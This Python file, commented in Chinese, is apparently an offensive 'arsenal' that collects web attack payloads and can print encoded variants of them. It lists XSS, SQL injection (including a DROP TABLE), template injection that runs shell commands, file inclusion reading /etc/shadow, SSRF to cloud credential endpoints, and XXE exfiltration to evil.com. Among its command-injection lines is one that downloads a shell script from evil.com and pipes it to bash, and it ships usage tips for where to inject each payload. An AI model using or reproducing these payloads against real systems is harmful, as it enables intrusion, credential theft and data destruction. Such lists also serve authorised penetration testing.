"""弹药库 - Payload 集合与编码变体生成 + GitHub 动态加载"""
import urllib.parse
import base64
import binascii
import json
import os
from pathlib import Path

PAYLOADS = {
    "XSS": [
        # 基础反射型
        "'\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\" onfocus=alert(1) autofocus=\"",
        "'-alert(1)-'",
        # 事件处理器变体
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<svg><script>alert&#40;1&#41;</script>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1)>",
        # DOM XSS 触发点
        "javascript:alert(document.cookie)",
        "javascript:alert(document.domain)",
        "javascript:alert(window.location)",
        # 绕过 WAF 的 polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
        "';alert(String.fromCharCode(88,83,83))//",
        "'-alert(1)-//",
        "'\\\"-alert(1)//",
        "<img/src/onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        # 无括号/无引号变体
        "onerror=alert`1`",
        "<svg/onload=alert`1`>",
        "javascript:alert`1`",
    ],
    "SQLi": [
        # 通用
        "' OR 1=1--",
        "\" OR 1=1--",
        "admin' --",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL,NULL--",
        # 时间盲注
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(10000000,SHA1('test'))--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND pg_sleep(5)--",
        # 数据提取
        "1' UNION SELECT username,password FROM users--",
        "1' UNION SELECT table_name,NULL FROM all_tables--",
        "1' UNION SELECT column_name,NULL FROM user_tab_columns--",
        # 报错注入
        "1' AND 1=CONVERT(int,@@version)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        # 绕过过滤
        "1'/**/UNION/**/SELECT/**/NULL--",
        "1'/*!UNION*/!SELECT/**/NULL--",
        "1' uni/**/on sel/**/ect 1--",
        "1' uNiOn SeLeCt 1--",
        # 数据库特定
        "1' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
        "1' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
        "'; DROP TABLE users;--",
    ],
    "SSTI": [
        # 通用探测
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        # Jinja2 (Python)
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{%import os%}{{os.popen('id').read()}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        # Twig (PHP)
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        # Freemarker (Java)
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
        # Velocity (Java)
        "#set($str=$class.inspect('java.lang.String'))",
        "#set($chr=$class.inspect('java.lang.Character'))",
        # Pug/Jade (Node)
        "| #{global.process.mainModule.require('child_process').execSync('id')}",
        # 沙盒逃逸
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__}}",
    ],
    "LFI": [
        # 基础路径穿越
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "....//....//....//....//etc/passwd",
        # PHP 伪协议
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "php://fd/3",
        "php://temp",
        # 其他协议
        "/proc/self/environ",
        "expect://id",
        "zip://shell.jpg%23shell.php",
        "phar://shell.jpg/shell.php",
        "/etc/passwd%00",
        # 空字节绕过
        "/etc/passwd%00.jpg",
        "/etc/passwd%2500",
        # Windows
        "..\\..\\..\\..\\windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        # 日志投毒
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/proc/self/fd/10",
        # Linux 特定
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/version",
        "/etc/hostname",
    ],
    "SSRF": [
        # 基础
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        # IPv6/编码绕过
        "http://[::1]",
        "http://0x7f000001",
        "http://2130706433",
        "http://0177.0.0.1",
        "http://127.0.0.1:8080/admin",
        # 协议利用
        "gopher://127.0.0.1:6379/_INFO",
        "gopher://127.0.0.1:6379/_flushall",
        "gopher://127.0.0.1:11211/_stats",
        # 云环境
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/pods",
        # DNS 重绑定
        "http://localtest.me",
        "http://spoofed.burpcollaborator.net",
        # 内网探测
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ],
    "XXE": [
        # 基础
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        # 外部 DTD
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>bar</foo>',
        # Blind XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe?data=file:///etc/passwd">]><foo>&xxe;</foo>',
        # 参数实体
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'%file;\')">%eval;%exfil;]><foo>bar</foo>',
        # SVG XXE
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        # XInclude
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        # SOAP XXE
        '<soap:Body><foo><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</foo></soap:Body>',
    ],
    "RCE": [
        # 通用
        "; id",
        "| id",
        "`id`",
        "$(id)",
        # 信息收集
        "; cat /etc/passwd",
        "| whoami",
        "; uname -a",
        "; id; cat /etc/shadow",
        # 下载执行
        "`curl http://evil.com`",
        "$(wget http://evil.com/shell.sh)",
        "; curl http://evil.com/shell.sh|bash",
        # 多语言
        "; python -c 'import os;os.system(\"id\")'",
        "; perl -e 'print `id`'",
        "; ruby -e 'exec(\"id\")'",
        "; php -r 'system(\"id\");'",
        "; node -e 'require(\"child_process\").execSync(\"id\")'",
        # 无空格绕过
        "{cat,/etc/passwd}",
        "cat${IFS}/etc/passwd",
        "cat$IFS/etc/passwd",
        "$@cat</etc/passwd",
        # 通配符绕过
        "/???/??t /???/p??s??",
        "/bin/c?t /etc/passwd",
        # Windows
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| whoami",
        "&& dir C:\\",
    ],
    "NoSQLi": [
        # MongoDB
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$exists": true}',
        'admin" && this.password.match(/.*/)//\n x',
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        # Redis
        "redis-cli flushall",
        "redis-cli CONFIG SET dir /var/www/html",
        "redis-cli CONFIG SET dbfilename shell.php",
        # CouchDB
        '{"_id": "_design/evil", "views": {"cmd": {"map": "function(doc){eval(doc.cmd)}"}}}',
        # Elasticsearch
        '{"query": {"match_all": {}}, "script": {"source": "Runtime.getRuntime().exec(\"id\")"}}',
    ],
    "JWT": [
        # alg:none
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        # 弱密钥
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
        # JKU 注入
        "eyJqdGkiOiJ4eHgiLCJhbGciOiJKU1UiLCJraWQiOiJodHRwczovL2V2aWwuY29tL2tleS5qc29uIn0.",
        # 密钥混淆 (RS256 → HS256)
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    ],
    "Deserialization": [
        # PHP
        "O:8:\"stdClass\":0:{}",
        "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImVtYWlsIjtzOjE6IngiO30=",
        # Python
        "cos\nsystem\n(S'id'\ntR.",
        "c__builtin__\nexec\n(S'import os; os.system(\"id\")'\ntR.",
        # Java
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        # Ruby
        "BAhJOkBDbGFzc0luZnVzZXI=",
        # .NET
        "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0=",
        # Node.js (node-serialize)
        "rZ7Csb2ZqZWN0LkNvbnNvbGUubG9nKDEp",
    ],
    "CRLF": [
        "%0d%0aInjected-Header:secops",
        "%0D%0AInjected-Header:secops",
        "\r\nInjected-Header:secops",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "%0d%0aLocation:https://evil.com",
        "%0d%0aSet-Cookie:session=evil",
        "%E5%98%8A%E5%98%8DInjected-Header:secops",
        "%c0%8a%c0%8aInjected-Header:secops",
        "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
    ],
    "LDAP": [
        "*",
        "*)",
        "*)(&",
        "admin*)(&",
        "(|(uid=*))",
        "(|(cn=*))",
        "(&(uid=*))",
        "*)(objectClass=*",
        "admin)(|(password=*))",
        "*))(|(uid=",
        "*)%00",
        "admin)(objectClass=*)",
        "(&(uid=*)(cn=*))",
    ],
    "Redirect": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com%2F%2F.evil.com",
        "https://evil.com@legitimate.com",
        "https://evil.com%0d%0aLocation:http://evil.com",
        "https://evil.com#https://legitimate.com",
        "https://evil.com/https://legitimate.com",
        "http://legitimate.com.evil.com",
        "//evil%00.com",
    ],
    "GraphQL": [
        "{ __schema { types { name } } }",
        "{ __type(name: \"User\") { fields { name type { name } } } }",
        "{ users { id email password } }",
        "{ user(id: \"1\") { id email role } }",
        "mutation { login(username: \"admin\", password: \"password\") { token } }",
    ],
    "Prototype": [
        "__proto__[polluted]=true",
        "__proto__.polluted=true",
        "constructor[prototype][polluted]=true",
        "{\"__proto__\":{\"polluted\":\"true\"}}",
        "[].constructor.prototype.indexOf.toString=function(){return true}",
    ],
    "SAML": [
        '<samlp:Response><saml:Assertion><saml:Conditions><saml:AudienceRestriction><saml:Audience>evil.com</saml:Audience></saml:AudienceRestriction></saml:Conditions></saml:Assertion></samlp:Response>',
    ],
    "SMB": [
        "\\\\evil.com\\share",
        "\\\\127.0.0.1\\share",
        "\\\\169.254.169.254\\share",
    ],
}

USAGE_GUIDE = {
    "XSS": "把代码复制到搜索框、评论区，或修改 ?keyword= 参数。",
    "SQLi": "把代码接在 URL 数字后面，如 ?id=1' OR 1=1--。",
    "SSTI": "在模板输入框填入 {{7*7}}，返回 49 则存在漏洞。",
    "LFI": "在文件参数中填入路径穿越，如 ?page=../../../../etc/passwd。",
    "SSRF": "在网址输入框填入内网地址，如 http://127.0.0.1。",
    "XXE": "在 XML 输入中填入外部实体定义。",
    "RCE": "在命令输入框后加上管道符和命令，如 127.0.0.1 | id。",
    "NoSQLi": "在 JSON 请求体中使用 MongoDB 操作符。",
    "JWT": "修改 JWT Header 将 alg 设为 none。",
    "Deserialization": "在序列化参数中填入恶意对象。",
    "CRLF": "在 URL 参数中使用 %0d%0a 注入换行符。",
    "LDAP": "在 LDAP 参数中使用通配符或括号注入。",
    "Redirect": "在重定向参数中使用 URL 编码绕过白名单。",
}


def generate_variations(payload: str) -> list:
    """根据基础 payload 生成不同编码和变体"""
    variations = [
        ("Raw", payload),
        ("URL Encoded", urllib.parse.quote(payload)),
        ("Double URL Encoded", urllib.parse.quote(urllib.parse.quote(payload))),
        ("Base64", base64.b64encode(payload.encode()).decode()),
        ("Hex", f"0x{binascii.hexlify(payload.encode()).decode()}"),
        ("Mixed Case", "".join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])),
    ]
    return variations


GITHUB_CACHE_FILE = Path(__file__).parent / "cache" / "github_payloads" / "latest_payloads.json"


def load_github_payloads():
    """从 GitHub 缓存加载 payload 并合并到 PAYLOADS"""
    if not GITHUB_CACHE_FILE.exists():
        return
    try:
        with open(GITHUB_CACHE_FILE, "r", encoding="utf-8") as f:
            github_data = json.load(f)
        
        CATEGORY_MAP = {
            "XSS": "XSS",
            "SQLi": "SQLi",
            "SSTI": "SSTI",
            "LFI": "LFI",
            "SSRF": "SSRF",
            "XXE": "XXE",
            "RCE": "RCE",
            "NoSQLi": "NoSQLi",
            "LDAP": "LDAP",
            "CRLF": "CRLF",
            "Deserialization_Java": "Deserialization",
            "Deserialization_PHP": "Deserialization",
            "Deserialization_Python": "Deserialization",
        }
        
        for github_cat, payloads in github_data.items():
            target_cat = CATEGORY_MAP.get(github_cat)
            if target_cat and payloads:
                if target_cat not in PAYLOADS:
                    PAYLOADS[target_cat] = []
                existing = set(PAYLOADS[target_cat])
                for p in payloads:
                    p = p.strip()
                    if p and len(p) > 2 and p not in existing:
                        PAYLOADS[target_cat].append(p)
                        existing.add(p)
    except Exception:
        pass


load_github_payloads()


def print_arsenal(category: str = None):
    print("\n==================================================")
    print("      [D] 获取免杀 Payload 与测试弹药")
    print("==================================================")

    if category and category.upper() in PAYLOADS:
        cat_upper = category.upper()
        print(f"\n[+] {cat_upper} 优质 Payload 列表:")
        if cat_upper in USAGE_GUIDE:
            print(USAGE_GUIDE[cat_upper])
            print("-" * 50)
        for p in PAYLOADS[cat_upper]:
            print(f"  - {p}")
            variations = generate_variations(p)
            for label, v in variations[1:]:
                print(f"    [{label}] {v}")
    else:
        for cat, payloads in PAYLOADS.items():
            print(f"\n[+] {cat} ({len(payloads)} 条):")
            if cat in USAGE_GUIDE:
                print(f"  {USAGE_GUIDE[cat]}")
            for p in payloads[:2]:
                print(f"  - {p}")


def get_arsenal_stats() -> dict:
    """返回弹药库统计信息"""
    stats = {}
    for cat, payloads in PAYLOADS.items():
        stats[cat] = len(payloads)
    stats["TOTAL"] = sum(stats.values())
    return stats
